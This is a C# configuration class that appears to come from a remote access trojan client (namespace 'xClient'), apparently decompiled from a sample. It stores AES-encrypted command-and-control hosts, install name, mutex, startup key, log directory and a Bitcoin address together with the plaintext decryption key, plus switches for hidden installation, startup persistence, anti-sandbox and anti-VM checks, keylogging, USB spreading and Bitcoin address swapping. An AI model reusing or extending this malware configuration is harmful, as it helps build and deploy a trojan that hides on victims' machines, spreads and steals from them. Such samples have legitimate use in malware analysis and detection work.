using System;
using xClient.Core.Cryptography;
using xClient.Core.Helper;

namespace xClient.Config;

public static class Settings
{
	public static string VERSION = "N8k4WloQOnf8LMzQQbMQ6GRtvheuM7JAkriIVgy5eUhIjSV4nWfrXUbZyYplyUlcFRAMmZ/k8/KDddRiYmJ17Q==";

	public static string HOSTS = "LQSPnJ4c5tkiAh/Bz/LvKi7ujtNxKAYYY74Qm586M8a9yjkxj7nFRAh+ea+HJptWQekpxQO7zOs3jc4rBLA+0aEEJvOqfvSLw2rLukPhduo=";

	public static int RECONNECTDELAY = 3000;

	public static string KEY = "CNL33PpYO/j/A9IMXFgkHA==";

	public static string AUTHKEY = "1bQ3mq8yQA0PSLUQSFgobzIjSevyq53q7cMqBMyrUI+bCFHKq5G22KHxjoL6TKSf5eSN6gBegzlg0t33QC75Yg==";

	public static Environment.SpecialFolder SPECIALFOLDER = Environment.SpecialFolder.ApplicationData;

	public static string DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);

	public static string SUBDIRECTORY = "ef1nD+suRo/MyVcst1XmFYL9gK/AMBTcWi5Zgef6mssBV8ruPrOsIrCyvVAblB9z3U2PjiOfvJyZBejY9b9MmA==";

	public static string INSTALLNAME = "ATc2rxEDeDbAcHub43o4VHmIu9+8Mx0tRp9htd+LsnYDzzIcD0bY8v2e+Hf5Y0zkgIkBhcpwmcFC/mEet4MK/5c6UDPn0krzBwxw2ph7f4o=";

	public static bool INSTALL = true;

	public static bool STARTUP = true;

	public static string MUTEX = "SZsuMb0FI9sDzduoNDooZh8ytrcMGZaDomMm99EYvQih1G231vya6hS/VTZoRTdkTdYlo3lUy8Hil2P99yXLhSln2Shb/Rc842iz0FHLNnM=";

	public static string STARTUPKEY = "uIblargx23JajgRZyqYY1gaOVAFY/33VymvOQy3TYbdVBRBmF+3VAGX0B5fj4jqwf4eSdof8J/RKv7DUsEUjjQ==";

	public static bool HIDEFILE = true;

	public static bool ENABLELOGGER = false;

	public static string ENCRYPTIONKEY = "BzIpKazdKZENzsJa4Vf2";

	public static string TAG = "rm0g9R3W0NG8wTf9Wz0yIOzF7rtPvLfJp6sCEeH8G17RMs8OHfW/RS5EmqIKVnVEQyYOhQng6JdBrkU4NCmnUw==";

	public static string LOGDIRECTORYNAME = "A10Xdp3DVSZFygRaupWS731wLm6wj/eruXW+CKy0nOCxDhvLCSUIbh1WN3bnjDHSgVywdshQz8U77sIVxzChzQ==";

	public static string USBSpreadNAME = "r8GjtoVmA6mO9XwDmjH6DahnTujLM0kcY0zIqXsOxfEz9I6DEbUN5AZ1M7PwnmBqlXGBHOhLOGqBAWs4aglgRQ==";

	public static string BTCAddress = "C663usdQC2BAoRk4zujUsSmEII5/PpIGs4ZFH23SV9PpB8PdjeLqnQZ7b9em83UYfyhr7VaUs95eR/lSiRWi7A==";

	public static bool HIDELOGDIRECTORY = false;

	public static bool HIDEINSTALLSUBDIRECTORY = true;

	public static bool ENABLEPERSISTENCE = false;

	public static bool ENABLEANTISANDBOXIE = true;

	public static bool ENABLEANTIVM = false;

	public static bool ENABLEUSBSPREAD = false;

	public static bool ANTIDEBUG = false;

	public static bool STARTUPPERSISTENCE = false;

	public static bool ENABLEBTCSWAP = false;

	public static bool Initialize()
	{
		if (string.IsNullOrEmpty(VERSION))
		{
			return false;
		}
		AES.SetDefaultKey(ENCRYPTIONKEY);
		TAG = AES.Decrypt(TAG);
		VERSION = AES.Decrypt(VERSION);
		HOSTS = AES.Decrypt(HOSTS);
		SUBDIRECTORY = AES.Decrypt(SUBDIRECTORY);
		INSTALLNAME = AES.Decrypt(INSTALLNAME);
		MUTEX = AES.Decrypt(MUTEX);
		STARTUPKEY = AES.Decrypt(STARTUPKEY);
		LOGDIRECTORYNAME = AES.Decrypt(LOGDIRECTORYNAME);
		USBSpreadNAME = AES.Decrypt(USBSpreadNAME);
		BTCAddress = AES.Decrypt(BTCAddress);
		FixDirectory();
		return true;
	}

	private static void FixDirectory()
	{
		if (!PlatformHelper.Is64Bit)
		{
			switch (SPECIALFOLDER)
			{
			case Environment.SpecialFolder.ProgramFilesX86:
				SPECIALFOLDER = Environment.SpecialFolder.ProgramFiles;
				break;
			case Environment.SpecialFolder.SystemX86:
				SPECIALFOLDER = Environment.SpecialFolder.System;
				break;
			}
			DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);
		}
	}
}
